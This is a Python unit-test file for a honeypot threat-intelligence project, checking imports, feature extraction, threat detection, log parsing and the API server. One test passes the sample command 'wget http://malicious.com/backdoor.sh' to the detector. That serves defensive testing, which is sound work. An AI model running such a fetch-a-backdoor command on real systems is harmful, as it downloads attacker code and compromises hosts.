#!/usr/bin/env python3
"""
Basic functionality tests for the Honeypot Intelligence System
Tests core imports and basic functionality without complex dependencies
"""

import unittest
import sys
import os
import tempfile
from datetime import datetime, timedelta

# Add parent directory to path to import modules
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))


class TestBasicFunctionality(unittest.TestCase):
    """Test basic system functionality"""
    
    def test_import_modules(self):
        """Test that all core modules can be imported"""
        try:
            import ai_threat_intel
            import api_server
            import realtime_monitor
            import parse_logs
            import demo
            self.assertTrue(True, "All modules imported successfully")
        except ImportError as e:
            self.fail(f"Failed to import modules: {e}")
    
    def test_ai_threat_intel_basic(self):
        """Test basic AI threat intelligence functionality"""
        from ai_threat_intel import AIThreatIntelligence
        
        # Create temporary model file to avoid training
        with tempfile.NamedTemporaryFile(suffix='.pkl', delete=False) as temp_model:
            temp_model_path = temp_model.name
        
        try:
            # This should work without training a new model
            ai_intel = AIThreatIntelligence(model_path=temp_model_path)
            self.assertIsNotNone(ai_intel)
            
            # Test feature extraction
            command = "ls -la"
            session_data = {
                'session_id': 'test_session',
                'start_time': datetime.now() - timedelta(minutes=5),
                'login_attempts': 1
            }
            
            features = ai_intel.extract_features(command, session_data)
            # Features are returned as a dict, convert to list for ML model
            if isinstance(features, dict):
                features_list = list(features.values())
                self.assertEqual(len(features_list), 6)  # Should have 6 features
            else:
                self.assertIsInstance(features, list)
                self.assertEqual(len(features), 6)  # Should have 6 features
            
        finally:
            # Clean up
            if os.path.exists(temp_model_path):
                os.unlink(temp_model_path)
    
    def test_realtime_monitor_basic(self):
        """Test basic real-time monitor functionality"""
        from realtime_monitor import ThreatDetectionEngine
        
        engine = ThreatDetectionEngine()
        
        # Test command analysis
        analysis = engine.analyze_command("ls -la", "test_session", datetime.now())
        
        self.assertIsInstance(analysis, dict)
        self.assertIn('threat_level', analysis)
        self.assertIn('detected_attacks', analysis)
        self.assertIn('risk_score', analysis)
        self.assertIn('session_profile', analysis)
    
    def test_threat_signatures(self):
        """Test threat signature detection"""
        from realtime_monitor import ThreatDetectionEngine
        
        engine = ThreatDetectionEngine()
        
        # Test malicious command detection
        malicious_command = "wget http://malicious.com/backdoor.sh"
        analysis = engine.analyze_command(malicious_command, "test_session", datetime.now())
        
        # Should detect some threat (even if low level)
        self.assertIsInstance(analysis['threat_level'], int)
        self.assertGreaterEqual(analysis['threat_level'], 0)
        self.assertIsInstance(analysis['detected_attacks'], list)
    
    def test_log_parsing_basic(self):
        """Test basic log parsing functionality"""
        from parse_logs import AdvancedHoneypotAnalyzer
        
        analyzer = AdvancedHoneypotAnalyzer()
        self.assertIsNotNone(analyzer)
        
        # Test database initialization
        self.assertTrue(os.path.exists(analyzer.db_path))
    
    def test_api_server_creation(self):
        """Test API server creation"""
        from api_server import app
        
        self.assertIsNotNone(app)
        # Check that the app has routes
        self.assertTrue(len(app.routes) > 0)
    
    def test_demo_components(self):
        """Test demo components"""
        from demo import HoneypotDemo
        
        demo = HoneypotDemo()
        self.assertIsNotNone(demo)
        self.assertIsInstance(demo.demo_commands, list)
        self.assertIsInstance(demo.demo_ips, list)
        self.assertTrue(len(demo.demo_commands) > 0)
        self.assertTrue(len(demo.demo_ips) > 0)


class TestConfigurationFiles(unittest.TestCase):
    """Test configuration and setup files"""
    
    def test_requirements_file_exists(self):
        """Test that requirements.txt exists and is readable"""
        req_file = os.path.join(os.path.dirname(os.path.dirname(__file__)), 'requirements.txt')
        self.assertTrue(os.path.exists(req_file))
        
        with open(req_file, 'r') as f:
            content = f.read()
            self.assertIn('fastapi', content)
            self.assertIn('scikit-learn', content)
            self.assertIn('pandas', content)
    
    def test_readme_exists(self):
        """Test that README.md exists and has content"""
        readme_file = os.path.join(os.path.dirname(os.path.dirname(__file__)), 'README.md')
        self.assertTrue(os.path.exists(readme_file))
        
        with open(readme_file, 'r', encoding='utf-8') as f:
            content = f.read()
            self.assertIn('Honeypot', content)
            self.assertIn('AI', content)
            self.assertGreater(len(content), 1000)  # Should be substantial
    
    def test_project_structure(self):
        """Test that key project files exist"""
        project_root = os.path.dirname(os.path.dirname(__file__))
        
        required_files = [
            'ai_threat_intel.py',
            'api_server.py',
            'realtime_monitor.py',
            'parse_logs.py',
            'demo.py',
            'requirements.txt',
            'README.md'
        ]
        
        for file_name in required_files:
            file_path = os.path.join(project_root, file_name)
            self.assertTrue(os.path.exists(file_path), f"Missing required file: {file_name}")


if __name__ == '__main__':
    # Run tests with verbose output
    unittest.main(verbosity=2)
